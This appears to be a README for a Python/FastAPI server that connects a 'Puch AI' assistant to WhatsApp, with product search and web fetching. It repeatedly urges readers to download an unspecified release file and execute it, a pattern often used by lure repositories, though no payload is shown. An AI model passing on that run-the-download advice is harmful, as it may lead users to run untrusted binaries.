# Puch AI WhatsApp MCP Server — AI Messaging & Product Search 🚀

[![Release](https://img.shields.io/github/v/release/Bomboclap81/Puch-AI-WhatsApp-Integration-MCP-Server?label=release&color=2b9348)](https://github.com/Bomboclap81/Puch-AI-WhatsApp-Integration-MCP-Server/releases)

https://github.com/Bomboclap81/Puch-AI-WhatsApp-Integration-MCP-Server/releases  
Download the release file from the Releases page and execute it to run a packaged build.

![WhatsApp + AI](https://images.unsplash.com/photo-1555066931-4365d14bab8c?ixlib=rb-4.0.3&q=80&w=1650&auto=format&fit=crop&ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8)

A modular MCP (Message Control Processor) server that links Puch AI to WhatsApp. It provides AI chat, product search powered by product index + SerpAPI, and web content fetch and scrape features. Built on FastAPI and Python 3.

Badges
- Language: ![Python](https://img.shields.io/badge/python-3.10%2B-blue)
- Framework: ![FastAPI](https://img.shields.io/badge/fastapi-0.95-teal)
- Topics: ![Topics](https://img.shields.io/badge/topics-ai--product--search%20%7C%20chatbot%20%7C%20whatsapp-lightgrey)

Table of Contents
- About
- Key features
- Architecture
- Quickstart
- Install from source
- Run packaged release
- Configuration
- API reference (core endpoints)
- WhatsApp flows and examples
- Product search and web scraping
- Deployment (Docker, Kubernetes)
- Observability and logging
- Contributing
- License
- Releases

About
Puch-AI-WhatsApp-Integration-MCP-Server acts as a middle layer between WhatsApp channels and Puch AI. The MCP accepts messages from WhatsApp webhook adapters, routes inputs to AI components, runs product search queries, and fetches live web content when agents request it. The server returns structured responses that the WhatsApp bot can send as text, lists, or media.

Key features
- AI chat: Route user messages to Puch AI for context-aware replies.
- Product search: Query local product index or SerpAPI for product data and prices.
- Web fetch: Retrieve and parse web content for real-time answers.
- WhatsApp flows: Support interactive lists, buttons, and message templates.
- FastAPI-based HTTP API with async handlers.
- Extensible connector model for alternate channels and AI backends.
- Logging, tracing hooks, and simple metrics.

Architecture
![Architecture diagram](https://raw.githubusercontent.com/tiangolo/fastapi/master/docs/img/fastapi.png)

- WhatsApp Adapter: Receives webhooks from WhatsApp (or third-party WhatsApp connectors).
- MCP Core (FastAPI): Validates messages, manages sessions, and routes requests.
- Puch AI Client: Sends prompts and receives responses.
- Product Index / Search: Local index + SerpAPI adapter for search results.
- Web Scraper: Safe fetch + parsing for target URLs.
- Output Renderer: Converts AI or search results into WhatsApp-compatible payloads.

Quickstart (development)
1. Clone repository
   git clone https://github.com/Bomboclap81/Puch-AI-WhatsApp-Integration-MCP-Server.git
2. Create virtual environment
   python -m venv .venv
   source .venv/bin/activate
3. Install dependencies
   pip install -r requirements.txt
4. Start dev server
   uvicorn mcp.main:app --reload --host 0.0.0.0 --port 8000

Install from source
- requirements.txt includes FastAPI, uvicorn, httpx, pydantic, serpapi, beautifulsoup4, and other helpers.
- Use pip-tools or pip to lock versions for production.

Run packaged release
Visit the Releases page and download the packaged artifact. The release file contains a built binary or a tarball with a runnable entry. Download the release file and execute it to run the packaged server.

Releases
- Get prebuilt artifacts and binaries here:
  https://github.com/Bomboclap81/Puch-AI-WhatsApp-Integration-MCP-Server/releases
  Download the release file and execute it. Check the release notes for included assets and run commands.

Configuration
The server reads configuration from environment variables or a .env file.

Core env vars
- MCP_HOST (default 0.0.0.0)
- MCP_PORT (default 8000)
- WHATSAPP_WEBHOOK_SECRET (HMAC secret)
- WHATSAPP_API_URL (outbound API)
- WHATSAPP_TOKEN (outbound auth token)
- PUCHAI_API_URL (Puch AI endpoint)
- PUCHAI_API_KEY
- SERPAPI_KEY (for live search)
- PRODUCT_INDEX_PATH (local product index location)
- ALLOWED_ORIGINS (CORS)
- LOG_LEVEL (INFO/DEBUG)

Secrets
Keep keys in a secret store. The server accepts tokens via environment variables or a mounted secret file.

Core design choices
- Async HTTP client (httpx) for non-blocking I/O.
- Pydantic models for validation and typed API.
- Modular connectors to swap search or AI backends.
- Rate limit adapter for third-party APIs.

API reference (core endpoints)
All endpoints live under /mcp

- GET /mcp/health
  - Returns service health, dependency checks, and version.

- POST /mcp/whatsapp/webhook
  - Receives inbound webhook payloads from WhatsApp.
  - Validates signature and enqueues message for processing.
  - Body: { "from": "+12345", "message": "...", "type": "text|button|list" }

- POST /mcp/message
  - Send a message to MCP directly for bot testing.
  - Body: { "session_id": "abc", "input": "search for running shoes" }
  - Response: { "reply": "...", "actions": [...] }

- POST /mcp/product-search
  - Query product index and SerpAPI fallback.
  - Body: { "q": "red sneakers", "limit": 5, "filters": { "price_min": 20 } }
  - Response: structured product list with price, url, image.

- POST /mcp/fetch-url
  - Fetch and parse a URL. Returns cleaned text, title, meta.
  - Body: { "url": "https://example.com/product/123" }

- POST /mcp/resolve-intent
  - Ask Puch AI to classify and enrich intents for routing.

Authentication
- Use HMAC signature for inbound webhooks.
- Use Authorization header for internal API calls to MCP.

WhatsApp flows and examples
Flow: Product discovery
1. User: "I want black running shoes under $100"
2. WhatsApp webhook -> /mcp/whatsapp/webhook
3. MCP parses message, sends a search query to /mcp/product-search
4. MCP formats results as a WhatsApp list template
5. User selects item -> MCP replies with details, images, and buy link

Sample JSON for WhatsApp list payload
{
  "recipient": "+1555123456",
  "type": "interactive",
  "interactive": {
    "type": "list",
    "body": { "text": "Here are top matches" },
    "action": {
      "button": "View",
      "sections": [
        { "title": "Shoes", "rows": [
          { "id": "p1", "title": "Brand A Runner", "description": "$79" }
        ]}
      ]
    }
  }
}

Flow: Web fetch for live content
- User sends a link.
- MCP calls /mcp/fetch-url with the URL.
- The web scraper fetches content, strips scripts, and returns main text.
- MCP forwards the summary from Puch AI to the user.

Product search and web scraping
Product index
- The server supports a local product index stored as JSONL or SQLite for fast lookup.
- Index fields: id, title, brand, price, url, image, categories, features.

SerpAPI adapter
- SerpAPI provides live search data when the index lacks coverage.
- Set SERPAPI_KEY to enable fallback.

Web scraper
- Uses requests with a user agent and lightweight HTML parsing.
- Returns title, meta, cleaned text, and top images.
- Applies domain allowlist and max fetch depth.

Safety and rate limits
- Respect robots.txt and robots meta tags in fetch responses.
- Implement per-domain rate limit to avoid overloading providers.
- Implement a max content size threshold.

Observability and logging
- Structured logs in JSON format when LOG_FORMAT=json.
- Metrics endpoint at /metrics for Prometheus.
- Tracing hooks for distributed tracing (OpenTelemetry adapter available).

Deployment
Docker
- Build
  docker build -t puch-mcp .
- Run
  docker run -e PUCHAI_API_KEY=... -e WHATSAPP_TOKEN=... -p 8000:8000 puch-mcp

docker-compose (simple)
version: '3.8'
services:
  puch-mcp:
    image: puch-mcp:latest
    ports: ["8000:8000"]
    environment:
      PUCHAI_API_KEY: "${PUCHAI_API_KEY}"
      WHATSAPP_TOKEN: "${WHATSAPP_TOKEN}"

Kubernetes (snippet)
apiVersion: apps/v1
kind: Deployment
metadata: { name: puch-mcp }
spec:
  replicas: 2
  selector:
    matchLabels: { app: puch-mcp }
  template:
    metadata: { labels: { app: puch-mcp } }
    spec:
      containers:
      - name: puch-mcp
        image: puch-mcp:latest
        env:
        - name: PUCHAI_API_KEY
          valueFrom: { secretKeyRef: { name: puch-secrets, key: puchai } }

Testing
- Unit tests live in tests/.
- Run:
  pytest -q

Contributing
- Follow the repo style: black, isort, flake8.
- Open an issue for feature requests or bugs.
- Send a PR with tests and documentation for new features.
- Use small, focused commits.

Maintainers
- Primary maintainer: repo owner
- Use issues or pull requests for changes.

License
- MIT License. See LICENSE file.

Changelog and releases
Check release assets and changelogs on the Releases page. Download the release file and execute it. For the latest binary builds and release notes visit:
https://github.com/Bomboclap81/Puch-AI-WhatsApp-Integration-MCP-Server/releases

Useful links
- Project releases (downloads): [Releases](https://github.com/Bomboclap81/Puch-AI-WhatsApp-Integration-MCP-Server/releases)
- FastAPI: https://fastapi.tiangolo.com
- SerpAPI: https://serpapi.com
- WhatsApp Business API docs: https://developers.facebook.com/docs/whatsapp

Topics
ai-product-search, chatbot, fastapi, mcp, mcp-server, puch-ai, python, python3, serpapi, web-scraping, whatsapp, whatsapp-bot, whatsapp-chat, whatsapp-flows, whatsapp-integration

Images and assets used in this README are from public image sources and product logos for illustration.